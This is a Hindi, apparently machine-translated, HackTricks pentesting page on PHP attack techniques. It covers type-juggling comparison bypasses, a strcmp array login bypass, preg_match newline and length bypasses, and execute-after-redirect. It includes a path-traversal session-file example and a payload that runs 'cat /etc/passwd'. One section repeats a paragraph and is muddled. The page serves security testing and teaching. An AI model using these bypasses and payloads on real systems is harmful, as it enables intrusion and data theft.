# PHP рдЯреНрд░рд┐рдХреНрд╕

<details>

<summary><a href="https://cloud.hacktricks.xyz/pentesting-cloud/pentesting-cloud-methodology"><strong>тШБя╕П HackTricks рдХреНрд▓рд╛рдЙрдб тШБя╕П</strong></a> -<a href="https://twitter.com/hacktricks_live"><strong>ЁЯРж рдЯреНрд╡рд┐рдЯрд░ ЁЯРж</strong></a> - <a href="https://www.twitch.tv/hacktricks_live/schedule"><strong>ЁЯОЩя╕П рдЯреНрд╡рд┐рдЪ ЁЯОЩя╕П</strong></a> - <a href="https://www.youtube.com/@hacktricks_LIVE"><strong>ЁЯОе рдпреВрдЯреНрдпреВрдм ЁЯОе</strong></a></summary>

* рдХреНрдпрд╛ рдЖрдк рдХрд┐рд╕реА **рд╕рд╛рдЗрдмрд░ рд╕реБрд░рдХреНрд╖рд╛ рдХрдВрдкрдиреА** рдореЗрдВ рдХрд╛рдо рдХрд░рддреЗ рд╣реИрдВ? рдХреНрдпрд╛ рдЖрдк рдЕрдкрдиреА **рдХрдВрдкрдиреА рдХреЛ HackTricks рдореЗрдВ рд╡рд┐рдЬреНрдЮрд╛рдкрд┐рдд** рджреЗрдЦрдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ? рдпрд╛ рдХреНрдпрд╛ рдЖрдкрдХреЛ **PEASS рдХреЗ рдирд╡реАрдирддрдо рд╕рдВрд╕реНрдХрд░рдг рдпрд╛ HackTricks рдХреЛ PDF рдореЗрдВ рдбрд╛рдЙрдирд▓реЛрдб рдХрд░рдиреЗ рдХрд╛ рдЙрдкрдпреЛрдЧ** рдХрд░рдиреЗ рдХреА рдЖрд╡рд╢реНрдпрдХрддрд╛ рд╣реИ? [**рд╕рджрд╕реНрдпрддрд╛ рдпреЛрдЬрдирд╛рдПрдВ**](https://github.com/sponsors/carlospolop) рдХреА рдЬрд╛рдВрдЪ рдХрд░реЗрдВ!
* рдЦреЛрдЬреЗрдВ [**The PEASS Family**](https://opensea.io/collection/the-peass-family), рд╣рдорд╛рд░рд╛ рд╡рд┐рд╢реЗрд╖ рд╕рдВрдЧреНрд░рд╣ [**NFTs**](https://opensea.io/collection/the-peass-family)
* рдкреНрд░рд╛рдкреНрдд рдХрд░реЗрдВ [**рдЖрдзрд┐рдХрд╛рд░рд┐рдХ PEASS & HackTricks swag**](https://peass.creator-spring.com)
* **рд╢рд╛рдорд┐рд▓ рд╣реЛрдВ** [**ЁЯТм**](https://emojipedia.org/speech-balloon/) [**рдбрд┐рд╕реНрдХреЙрд░реНрдб рд╕рдореВрд╣**](https://discord.gg/hRep4RUj7f) рдпрд╛ [**рдЯреЗрд▓реАрдЧреНрд░рд╛рдо рд╕рдореВрд╣**](https://t.me/peass) рдореЗрдВ **рдпрд╛** рдореБрдЭреЗ **рдЯреНрд╡рд┐рдЯрд░** рдкрд░ **рдлрд╝реЙрд▓реЛ** рдХрд░реЗрдВ [**ЁЯРж**](https://github.com/carlospolop/hacktricks/tree/7af18b62b3bdc423e11444677a6a73d4043511e9/\[https:/emojipedia.org/bird/README.md)[**@carlospolopm**](https://twitter.com/hacktricks\_live)**.**
* **рдЕрдкрдиреЗ рд╣реИрдХрд┐рдВрдЧ рдЯреНрд░рд┐рдХреНрд╕ рд╕рд╛рдЭрд╛ рдХрд░реЗрдВ рджреНрд╡рд╛рд░рд╛ PRs рд╕рдмрдорд┐рдЯ рдХрд░рдХреЗ** [**hacktricks repo**](https://github.com/carlospolop/hacktricks) **рдФрд░** [**hacktricks-cloud repo**](https://github.com/carlospolop/hacktricks-cloud).

</details>

## рдХреБрдХреАрдЬрд╝ рд╕рд╛рдорд╛рдиреНрдп рд╕реНрдерд╛рди:

рдпрд╣ phpMyAdmin рдХреБрдХреАрдЬрд╝ рдХреЗ рд▓рд┐рдП рднреА рдорд╛рдиреНрдп рд╣реИред

рдХреБрдХреАрдЬрд╝:
```
PHPSESSID
phpMyAdmin
```
рд╕реНрдерд╛рди:
```
/var/lib/php/sessions
/var/lib/php5/
/tmp/
Example: ../../../../../../tmp/sess_d1d531db62523df80e1153ada1d4b02e
```
## PHP рддреБрд▓рдирд╛рдПрдВ рдЫрд▓ рдХрд░рдирд╛

### рдвреАрд▓реА рддреБрд▓рдирд╛рдПрдВ / рдЯрд╛рдЗрдк рдЬрдЧрд▓рд┐рдВрдЧ ( == )

рдпрджрд┐ PHP рдореЗрдВ `==` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ рдРрд╕реЗ рдЕрдкреНрд░рддреНрдпрд╛рд╢рд┐рдд рдорд╛рдорд▓реЗ рд╣реЛ рд╕рдХрддреЗ рд╣реИрдВ рдЬрд╣рд╛рдВ рддреБрд▓рдирд╛ рдЙрдореНрдореАрдж рдХреЗ рдЕрдиреБрд╕рд╛рд░ рд╡реНрдпрд╡рд╣рд╛рд░ рдирд╣реАрдВ рдХрд░рддреА рд╣реИред рдЗрд╕рдХрд╛ рдХрд╛рд░рдг рдпрд╣ рд╣реИ рдХрд┐ "==" рдХреЗрд╡рд▓ рдЙрди рдорд╛рдиреЛрдВ рдХреА рддреБрд▓рдирд╛ рдХрд░рддрд╛ рд╣реИ рдЬреЛ рдПрдХ рд╣реА рдкреНрд░рдХрд╛рд░ рдореЗрдВ рд░реВрдкрд╛рдВрддрд░рд┐рдд рд╣реЛрддреЗ рд╣реИрдВ, рдпрджрд┐ рдЖрдк рдпрд╣ рднреА рддреБрд▓рдирд╛ рдХрд░рдирд╛ рдЪрд╛рд╣рддреЗ рд╣реИрдВ рдХрд┐ рддреБрд▓рд┐рдд рдбреЗрдЯрд╛ рдХрд╛ рдкреНрд░рдХрд╛рд░ рднреА рд╕рдорд╛рди рд╣реИ, рддреЛ рдЖрдкрдХреЛ `===` рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдирд╛ рд╣реЛрдЧрд╛ред

PHP рддреБрд▓рдирд╛ рд╕рд╛рд░рдгрд┐рдХ: [https://www.php.net/manual/en/types.comparisons.php](https://www.php.net/manual/en/types.comparisons.php)

![](<../../../.gitbook/assets/image (40) (1).png>)

{% file src="../../../.gitbook/assets/EN-PHP-loose-comparison-Type-Juggling-OWASP (1).pdf" %}

* `"string" == 0 -> True` рдПрдХ рдРрд╕реА рд╕реНрдЯреНрд░рд┐рдВрдЧ рдЬреЛ рдХрд┐рд╕реА рднреА рд╕рдВрдЦреНрдпрд╛ рд╕реЗ рд╢реБрд░реВ рдирд╣реАрдВ рд╣реЛрддреА рд╣реИ, рдПрдХ рд╕рдВрдЦреНрдпрд╛ рдХреЗ рдмрд░рд╛рдмрд░ рд╣реЛрддреА рд╣реИ
* `"0xAAAA" == "43690" -> True` рджрд╢рдорд▓рд╡ рдпрд╛ рд╣реЗрдХреНрд╕ рдлреЙрд░реНрдореЗрдЯ рдореЗрдВ рд╕рдВрдЦреНрдпрд╛рдУрдВ рд╕реЗ рдорд┐рд▓рдХрд░ рдмрдиреА рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреЛ рдЕрдиреНрдп рд╕рдВрдЦреНрдпрд╛рдУрдВ / рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреЗ рд╕рд╛рде рддреБрд▓рдирд╛ рдХреА рдЬрд╛ рд╕рдХрддреА рд╣реИ, рдпрджрд┐ рд╕рдВрдЦреНрдпрд╛рдПрдВ рд╕рдорд╛рди рдереАрдВ (рд╕реНрдЯреНрд░рд┐рдВрдЧ рдореЗрдВ рд╕рдВрдЦреНрдпрд╛рдПрдВ рд╕рдВрдЦреНрдпрд╛рдУрдВ рдХреЗ рд░реВрдк рдореЗрдВ рд╡реНрдпрд╛рдЦреНрдпрд╛ рдХреА рдЬрд╛рддреА рд╣реИрдВ)
* `"0e3264578" == 0 --> True` "0e" рд╕реЗ рд╢реБрд░реВ рд╣реЛрдиреЗ рдФрд░ рдХреБрдЫ рднреА рдЖрдиреЗ рд╡рд╛рд▓реЗ рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреЛ 0 рдХреЗ рдмрд░рд╛рдмрд░ рдорд╛рдирд╛ рдЬрд╛рдПрдЧрд╛
* `"0X3264578" == 0X --> True` "0" рд╕реЗ рд╢реБрд░реВ рд╣реЛрдиреЗ рдФрд░ рдХрд┐рд╕реА рднреА рдЕрдХреНрд╖рд░ (X рдХрд┐рд╕реА рднреА рдЕрдХреНрд╖рд░ рд╣реЛ рд╕рдХрддрд╛ рд╣реИ) рдХреЗ рдмрд╛рдж рдФрд░ рдХреБрдЫ рднреА рдЖрдиреЗ рд╡рд╛рд▓реЗ рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреЛ 0 рдХреЗ рдмрд░рд╛рдмрд░ рдорд╛рдирд╛ рдЬрд╛рдПрдЧрд╛
* `"0e12334" == "0" --> True` рдпрд╣ рдмрд╣реБрдд рджрд┐рд▓рдЪрд╕реНрдк рд╣реИ рдХреНрдпреЛрдВрдХрд┐ рдХреБрдЫ рдорд╛рдорд▓реЛрдВ рдореЗрдВ рдЖрдк "0" рдХреЗ рд╕реНрдЯреНрд░рд┐рдВрдЧ рдЗрдирдкреБрдЯ рдФрд░ рдЙрд╕рдХреЗ рд╕рд╛рде рддреБрд▓рдирд╛ рдХрд░рдиреЗ рд╡рд╛рд▓реА рдХреБрдЫ рд╕рд╛рдордЧреНрд░реА рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ рд╣реИрд╢ рдХреЗ рд╕рд╛рде рд╢реБрд░реВ рд╣реЛрддреА рд╣реИ рдФрд░ рдЙрд╕рдореЗрдВ рдХреЛрдИ рдЕрдХреНрд╖рд░ рдирд╣реАрдВ рд╣реЛрддрд╛ рд╣реИ, рдЗрд╕рд▓рд┐рдП, рдпрджрд┐ рдЖрдк рдПрдХ рдорд╛рди рдкреНрд░рджрд╛рди рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдЬреЛ "0e" рд╕реЗ рд╢реБрд░реВ рд╣реЛрдиреЗ рдФрд░ рдХрд┐рд╕реА рднреА рдЕрдХреНрд╖рд░ рдХреЗ рдмрд┐рдирд╛ рд╣реИрд╢ рдмрдирд╛рдПрдЧрд╛, рддреЛ рдЖрдк рддреБрд▓рдирд╛ рдХреЛ рдЫрд▓ рд╕рдХрддреЗ рд╣реИрдВред рдЖрдк рдпрд╣рд╛рдВ рдЗрд╕ рдкреНрд░рд╛рд░реВрдк рдореЗрдВ **рдкрд╣рд▓реЗ рд╕реЗ рд╣реА рд╣реИрд╢ рдмрдирд╛рдИ рдЧрдИ рд╕реНрдЯреНрд░рд┐рдВрдЧ** рдвреВрдВрдв рд╕рдХрддреЗ рд╣реИрдВ: [https://github.com/spaze/hashes](https://github.com/spaze/hashes)
* `"X" == 0 --> True` рд╕реНрдЯреНрд░рд┐рдВрдЧ рдореЗрдВ рдХреЛрдИ рднреА рдЕрдХреНрд╖рд░ рдЗрдВрдЯ 0 рдХреЗ рдмрд░рд╛рдмрд░ рд╣реЛрддрд╛ рд╣реИ

рдЕрдзрд┐рдХ рдЬрд╛рдирдХрд╛рд░реА рдХреЗ рд▓рд┐рдП [https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09](https://medium.com/swlh/php-type-juggling-vulnerabilities-3e28c4ed5c09) рдкрд░ рджреЗрдЦреЗрдВ

### **in\_array()**

**рдЯрд╛рдЗрдк рдЬрдЧрд▓рд┐рдВрдЧ** рдХреЛ рдбрд┐рдлрд╝реЙрд▓реНрдЯ рд░реВрдк рд╕реЗ `in_array()` рдлрд╝рдВрдХреНрд╢рди рдкрд░ рднреА рдкреНрд░рднрд╛рд╡рд┐рдд рдХрд░рддрд╛ рд╣реИ (рдЖрдкрдХреЛ рддреАрд╕рд░рд╛ рддрд░реНрдХ рд╕рддреНрдпрд╛рдкрди рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рддрдп рдХрд░рдирд╛ рд╣реЛрдЧрд╛):
```php
$values = array("apple","orange","pear","grape");
var_dump(in_array(0, $values));
//True
var_dump(in_array(0, $values, true));
//False
```
### strcmp()/strcasecmp()

рдпрджрд┐ рдЗрд╕ рдлрд╝рдВрдХреНрд╢рди рдХрд╛ рдЙрдкрдпреЛрдЧ **рдХрд┐рд╕реА рдкреНрд░рдорд╛рдгреАрдХрд░рдг рдЬрд╛рдВрдЪ** рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ (рдЬреИрд╕реЗ рдкрд╛рд╕рд╡рд░реНрдб рдХреА рдЬрд╛рдВрдЪ рдХрд░рдирд╛) рдФрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдПрдХ рддреБрд▓рдирд╛ рдХреЗ рдПрдХ рдкрдХреНрд╖ рдХреЛ рдирд┐рдпрдВрддреНрд░рд┐рдд рдХрд░рддрд╛ рд╣реИ, рддреЛ рд╡рд╣ рдкрд╛рд╕рд╡рд░реНрдб рдХреЗ рдорд╛рди рдХреЗ рд░реВрдк рдореЗрдВ рдПрдХ рдЦрд╛рд▓реА рд╕рд░рдгреА рднреЗрдЬ рд╕рдХрддрд╛ рд╣реИ (`https://example.com/login.php/?username=admin&password[]=`) рдФрд░ рдЗрд╕ рдЬрд╛рдВрдЪ рдХреЛ рдЫрд▓ рдХрд░ рд╕рдХрддрд╛ рд╣реИ:
```php
if (!strcmp("real_pwd","real_pwd")) { echo "Real Password"; } else { echo "No Real Password"; }
// Real Password
if (!strcmp(array(),"real_pwd")) { echo "Real Password"; } else { echo "No Real Password"; }
// Real Password
```
рдпрд╣реА рддреНрд░реБрдЯрд┐ `strcasecmp()` рдХреЗ рд╕рд╛рде рднреА рд╣реЛрддреА рд╣реИред

### рд╕рдЦреНрдд рдкреНрд░рдХрд╛рд░ рдХрд╛ рдЬреБрдЧрд╛рдбрд╝

рдпрджреНрдпрдкрд┐ `===` рдХрд╛ рдЙрдкрдпреЛрдЧ рд╣реЛ рд░рд╣рд╛ рд╣реИ, рддреЛ рднреА рддреНрд░реБрдЯрд┐рдпрд╛рдБ рд╣реЛ рд╕рдХрддреА рд╣реИрдВ рдЬреЛ рддреБрд▓рдирд╛ рдХреЛ **рдкреНрд░рдХрд╛рд░ рдЬреБрдЧрд╛рдбрд╝** рдХреЗ рд▓рд┐рдП рд╕рдВрдХреНрд░рдорд┐рдд рдХрд░рддреА рд╣реИрдВред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдпрджрд┐ рддреБрд▓рдирд╛ **рддреБрд▓рдирд╛ рдХрд░рдиреЗ рд╕реЗ рдкрд╣рд▓реЗ рдбреЗрдЯрд╛ рдХреЛ рдПрдХ рдЕрд▓рдЧ рдкреНрд░рдХрд╛рд░ рдХреЗ рдСрдмреНрдЬреЗрдХреНрдЯ рдореЗрдВ рдкрд░рд┐рд╡рд░реНрддрд┐рдд рдХрд░ рд░рд╣реА рд╣реИ**:
```php
(int) "1abc" === (int) "1xyz" //This will be true
```
### preg\_match(/^.\*/)

**`preg_match()`** рдХрд╛ рдЙрдкрдпреЛрдЧ **рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЗрдирдкреБрдЯ рдХреА рдкреБрд╖реНрдЯрд┐ рдХрд░рдиреЗ** рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛ рд╕рдХрддрд╛ рд╣реИ (рдпрд╣ рдпрд╣ рдЬрд╛рдВрдЪрддрд╛ рд╣реИ рдХрд┐ рдХреНрдпрд╛ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЗрдирдкреБрдЯ рдореЗрдВ рдХреЛрдИ **рд╢рдмреНрдж/рд░реЗрдЬреЗрдХреНрд╕** рдмреНрд▓реИрдХрд▓рд┐рд╕реНрдЯ рдореЗрдВ рдореМрдЬреВрдж рд╣реИ рдФрд░ рдпрджрд┐ рдирд╣реАрдВ рд╣реИ, рддреЛ рдХреЛрдб рдЕрдкрдиреЗ рдирд┐рд╖реНрдкрд╛рджрди рдХреЛ рдЬрд╛рд░реА рд░рдЦ рд╕рдХрддрд╛ рд╣реИ)ред

#### рдирдИ рдкрдВрдХреНрддрд┐ рдмрд╛рдИрдкрд╛рд╕

рд╣рд╛рд▓рд╛рдВрдХрд┐, рдЬрдм рд░реЗрдЬреЗрдХреНрд╕ рдХреА рд╢реБрд░реБрдЖрдд рдХреЛ рдирд┐рд░реНрдзрд╛рд░рд┐рдд рдХрд░рддреЗ рд╣реИрдВ, `preg_match()` **рдХреЗрд╡рд▓ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдЗрдирдкреБрдЯ рдХреА рдкрд╣рд▓реА рдкрдВрдХреНрддрд┐ рдХреА рдЬрд╛рдВрдЪ рдХрд░рддрд╛ рд╣реИ**, рдлрд┐рд░ рдпрджрд┐ рдХрд┐рд╕реА рддрд░рд╣ рд╕реЗ рдЖрдк рдЗрдирдкреБрдЯ рдХреЛ **рдХрдИ рдкрдВрдХреНрддрд┐рдпреЛрдВ рдореЗрдВ рднреЗрдЬ рд╕рдХрддреЗ рд╣реИрдВ**, рддреЛ рдЖрдк рдЗрд╕ рдЬрд╛рдВрдЪ рдХреЛ рдмрд╛рдИрдкрд╛рд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЙрджрд╛рд╣рд░рдг:
```php
$myinput="aaaaaaa
11111111"; //Notice the new line
echo preg_match("/1/",$myinput);
//1  --> In this scenario preg_match find the char "1"
echo preg_match("/1.*$/",$myinput);
//1  --> In this scenario preg_match find the char "1"
echo preg_match("/^.*1/",$myinput);
//0  --> In this scenario preg_match DOESN'T find the char "1"
echo preg_match("/^.*1.*$/",$myinput);
//0  --> In this scenario preg_match DOESN'T find the char "1"
```
рдЗрд╕ рдЬрд╛рдВрдЪ рдХреЛ рдЕрдирджреЗрдЦрд╛ рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдЖрдк **рдирдП-рд▓рд╛рдЗрдиреНрд╕ urlencoded** (`%0A`) рдХреЗ рд╕рд╛рде рдорд╛рди рднреЗрдЬ рд╕рдХрддреЗ рд╣реИрдВ рдпрд╛ рдпрджрд┐ рдЖрдк **JSON рдбреЗрдЯрд╛** рднреЗрдЬ рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ рдЗрд╕реЗ **рдХрдИ рд▓рд╛рдЗрдиреЛрдВ** рдореЗрдВ рднреЗрдЬреЗрдВ:
```php
{
"cmd": "cat /etc/passwd"
}
```
рдпрд╣рд╛рдВ рдПрдХ рдЙрджрд╛рд╣рд░рдг рдорд┐рд▓реЗрдЧрд╛: [https://ramadistra.dev/fbctf-2019-rceservice](https://ramadistra.dev/fbctf-2019-rceservice)

#### **рд▓рдВрдмрд╛рдИ рддреНрд░реБрдЯрд┐ рдмрд╛рдИрдкрд╛рд╕**

(рдпрд╣ рдмрд╛рдИрдкрд╛рд╕ рдЕрдкреЗрдХреНрд╖рд┐рдд рд░реВрдк рд╕реЗ PHP 5.2.5 рдкрд░ рдкреНрд░рдпрд╛рд╕ рдХрд┐рдпрд╛ рдЧрдпрд╛ рдерд╛ рдФрд░ рдореБрдЭреЗ PHP 7.3.15 рдкрд░ рдХрд╛рдо рдирд╣реАрдВ рдХрд░рд╛ рд╕рдХрд╛)\
рдпрджрд┐ рдЖрдк `preg_match()` рдХреЛ рдПрдХ рдорд╛рдиреНрдп рдмрд╣реБрдд **рдмрдбрд╝реЗ рдЗрдирдкреБрдЯ** рдХреЛ рднреЗрдЬ рд╕рдХрддреЗ рд╣реИрдВ, рддреЛ рдпрд╣ рдЗрд╕реЗ **рдкреНрд░реЛрд╕реЗрд╕ рдХрд░рдиреЗ рдореЗрдВ рд╕рдХреНрд╖рдо рдирд╣реАрдВ рд╣реЛрдЧрд╛** рдФрд░ рдЖрдкрдХреЛ **рдЪреЗрдХ рдХреЛ рдмрд╛рдИрдкрд╛рд╕ рдХрд░рдиреЗ** рдХреА рдЕрдиреБрдорддрд┐ рдорд┐рд▓реЗрдЧреАред рдЙрджрд╛рд╣рд░рдг рдХреЗ рд▓рд┐рдП, рдпрджрд┐ рдпрд╣ рдПрдХ JSON рдХреЛ рдмреНрд▓реИрдХрд▓рд┐рд╕реНрдЯ рдХрд░ рд░рд╣рд╛ рд╣реИ, рддреЛ рдЖрдк рднреЗрдЬ рд╕рдХрддреЗ рд╣реИрдВ:
```
payload = '{"cmd": "ls -la", "injected": "'+ "a"*1000000 + '"}'
```
рдЯрд╛рдЗрдк рдЬрдЧрд▓рд┐рдВрдЧ PHP рдЕрд╡рд░реЛрдзрди рдХреЗ рд▓рд┐рдП

рдЯрд╛рдЗрдк рдЬрдЧрд▓рд┐рдВрдЧ рдПрдХ рддрдХрдиреАрдХ рд╣реИ рдЬрд┐рд╕рдХрд╛ рдЙрдкрдпреЛрдЧ PHP рдХреЛрдб рдХреЛ рдЕрд╡рд░реЛрдзрд┐рдд рдХрд░рдиреЗ рдХреЗ рд▓рд┐рдП рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдпрд╣ рдПрдХ рдЕрд╕рд╛рдорд╛рдиреНрдп рддрдХрдиреАрдХ рд╣реИ рдЬрд┐рд╕рдореЗрдВ рдбреЗрдЯрд╛ рдХреЗ рдЯрд╛рдЗрдк рдХреЛ рдмрджрд▓рдХрд░ рдЙрд╕реЗ рдЕрдирджреЗрдЦрд╛ рдХрд░ рджрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИред рдЗрд╕рдХрд╛ рдкрд░рд┐рдгрд╛рдо рд╣реЛрддрд╛ рд╣реИ рдХрд┐ рдХреЛрдб рдХреЛ рдкрдврд╝рдиреЗ рд╡рд╛рд▓реЗ рд╡реНрдпрдХреНрддрд┐ рдХреЛ рдЕрд╕рд╛рдорд╛рдиреНрдп рдпрд╛ рдЕрдкреНрд░рддреНрдпрд╛рд╢рд┐рдд рдкрд░рд┐рдгрд╛рдо рдорд┐рд▓рддрд╛ рд╣реИред

рдЯрд╛рдЗрдк рдЬрдЧрд▓рд┐рдВрдЧ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ, рд╣рдо рд╡рд┐рднрд┐рдиреНрди рдбреЗрдЯрд╛ рдЯрд╛рдЗрдкреНрд╕ рдХреЛ рдорд┐рд╢реНрд░рд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЬреИрд╕реЗ рдХрд┐ рд╕реНрдЯреНрд░рд┐рдВрдЧ, рдирдВрдмрд░, рдмреВрд▓рд┐рдпрди, рдФрд░ рдСрдмреНрдЬреЗрдХреНрдЯреНрд╕ред рдЗрд╕рдХреЗ рд▓рд┐рдП, рд╣рдо рд╡рд┐рднрд┐рдиреНрди рдСрдкрд░реЗрдЯрд░реНрд╕ рдФрд░ рдЯрд╛рдЗрдк рдХрд╛рд╕реНрдЯрд┐рдВрдЧ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рддреЗ рд╣реИрдВред

рдЯрд╛рдЗрдк рдЬрдЧрд▓рд┐рдВрдЧ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ, рд╣рдо рдЕрдкреНрд░рддреНрдпрд╛рд╢рд┐рдд рдкрд░рд┐рдгрд╛рдо рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЬреИрд╕реЗ рдХрд┐ рдПрдХ рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреЛ рдирдВрдмрд░ рдорд╛рдирд╛ рдЬрд╛рдП рдпрд╛ рдПрдХ рдирдВрдмрд░ рдХреЛ рд╕реНрдЯреНрд░рд┐рдВрдЧ рдорд╛рдирд╛ рдЬрд╛рдПред рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ, рд╣рдо рдЕрдкреНрд░рддреНрдпрд╛рд╢рд┐рдд рд░реВрдк рд╕реЗ рдХреЛрдб рдХреЛ рдЕрд╡рд░реЛрдзрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдЧреБрдорд░рд╛рд╣ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред

рдЯрд╛рдЗрдк рдЬрдЧрд▓рд┐рдВрдЧ рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ, рд╣рдо рдЕрдкреНрд░рддреНрдпрд╛рд╢рд┐рдд рдкрд░рд┐рдгрд╛рдо рдкреНрд░рд╛рдкреНрдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ, рдЬреИрд╕реЗ рдХрд┐ рдПрдХ рд╕реНрдЯреНрд░рд┐рдВрдЧ рдХреЛ рдирдВрдмрд░ рдорд╛рдирд╛ рдЬрд╛рдП рдпрд╛ рдПрдХ рдирдВрдмрд░ рдХреЛ рд╕реНрдЯреНрд░рд┐рдВрдЧ рдорд╛рдирд╛ рдЬрд╛рдПред рдЗрд╕рдХрд╛ рдЙрдкрдпреЛрдЧ рдХрд░рдХреЗ, рд╣рдо рдЕрдкреНрд░рддреНрдпрд╛рд╢рд┐рдд рд░реВрдк рд╕реЗ рдХреЛрдб рдХреЛ рдЕрд╡рд░реЛрдзрд┐рдд рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ рдФрд░ рдЙрдкрдпреЛрдЧрдХрд░реНрддрд╛ рдХреЛ рдЧреБрдорд░рд╛рд╣ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред
```php
$obfs = "1"; //string "1"
$obfs++; //int 2
$obfs += 0.2; //float 2.2
$obfs = 1 + "7 IGNORE"; //int 8
$obfs = "string" + array("1.1 striiing")[0]; //float 1.1
$obfs = 3+2 * (TRUE + TRUE); //int 7
$obfs .= ""; //string "7"
$obfs += ""; //int 7
```
## рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ рдХреЗ рдмрд╛рдж рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░реЗрдВ (EAR)

рдпрджрд┐ PHP рдХрд┐рд╕реА рдЕрдиреНрдп рдкреЗрдЬ рдкрд░ рд░реАрдбрд╛рдпрд░реЗрдХреНрдЯ рдХрд░ рд░рд╣рд╛ рд╣реИ рд▓реЗрдХрд┐рди **`die`** рдпрд╛ **`exit`** рдлрд╝рдВрдХреНрд╢рди рдХреЛ **`Location`** рд╣реИрдбрд░ рдХреЗ рдмрд╛рдж рдХреЙрд▓ рдирд╣реАрдВ рдХрд┐рдпрд╛ рдЬрд╛рддрд╛ рд╣реИ, рддреЛ PHP рдирд┐рд╖реНрдкрд╛рджрд┐рдд рдХрд░рдирд╛ рдЬрд╛рд░реА рд░рдЦрддрд╛ рд╣реИ рдФрд░ рдбреЗрдЯрд╛ рдХреЛ рдмреЙрдбреА рдореЗрдВ рдЬреЛрдбрд╝рддрд╛ рд╣реИ:
```php
<?php
// In this page the page will be read and the content appended to the body of
// the redirect response
$page = $_GET['page'];
header('Location: /index.php?page=default.html');
readfile($page);
?>
```
## рдФрд░ рдЯреНрд░рд┐рдХреНрд╕

* **register\_globals**: **PHP < 4.1.1.1** рдореЗрдВ рдпрд╛ рдЕрдЧрд░ рдЧрд▓рдд рд░реВрдк рд╕реЗ рдХреЙрдиреНрдлрд╝рд┐рдЧрд░ рдХрд┐рдпрд╛ рдЧрдпрд╛ рд╣реИ, рддреЛ **register\_globals** рд╕рдХреНрд░рд┐рдп рд╣реЛ рд╕рдХрддрд╛ рд╣реИ (рдпрд╛ рдЙрдирдХрд╛ рд╡реНрдпрд╡рд╣рд╛рд░ рдирдХрд▓ рдХрд┐рдпрд╛ рдЬрд╛ рд░рд╣рд╛ рд╣реИ)ред рдЗрд╕рдХрд╛ рдЕрд░реНрде рд╣реИ рдХрд┐ рдЧреНрд▓реЛрдмрд▓ рд╡реЗрд░рд┐рдПрдмрд▓реНрд╕ рдореЗрдВ рдЬреИрд╕реЗ $\_GET рдореЗрдВ рд╡реЗрд░рд┐рдПрдмрд▓ рдХреА рдорд╛рдиреНрдпрддрд╛ рд╣реЛрддреА рд╣реИ рдЬреИрд╕реЗ $\_GET\["param"]="1234", рдЖрдк рдЗрд╕реЗ **$param рдХреЗ рдорд╛рдзреНрдпрдо рд╕реЗ рдПрдХреНрд╕реЗрд╕ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВред рдЗрд╕рд▓рд┐рдП, HTTP рдкреИрд░рд╛рдореАрдЯрд░ рднреЗрдЬрдХрд░ рдЖрдк рдХреЛрдб рдХреЗ рднреАрддрд░ рдЙрдкрдпреЛрдЧ рд╣реЛрдиреЗ рд╡рд╛рд▓реЗ рд╡реЗрд░рд┐рдПрдмрд▓реНрд╕ рдХреЛ рдУрд╡рд░рд░рд╛рдЗрдЯ рдХрд░ рд╕рдХрддреЗ рд╣реИрдВ**ред
